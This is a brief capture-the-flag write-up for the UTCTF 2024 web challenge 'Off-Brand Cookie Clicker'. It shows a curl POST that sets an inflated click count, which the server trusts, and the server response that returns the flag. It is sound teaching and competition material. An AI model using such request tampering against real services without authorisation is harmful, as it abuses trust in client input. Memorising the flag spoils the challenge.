# Beginner: Off-Brand Cookie Clicker | Web | UTCTF 2024

Inspect the JS code handling cookie button clicks. Everytime the button is clicked, a POST request with the parameter `count` is sent to `/click`. Send a POST request with a count of at least 10,000,000 to get the flag.

```
$ curl -X POST guppy.utctf.live:8138/click -d "count=10000000" -i
HTTP/1.1 200 OK
Server: Werkzeug/3.0.2 Python/3.8.19
Date: Thu, 04 Apr 2024 00:18:17 GMT
Content-Type: application/json
Content-Length: 69
Connection: close

{"flag":"Wow, you beat me. Congrats! utflag{y0u_cl1ck_pr3tty_f4st}"}
```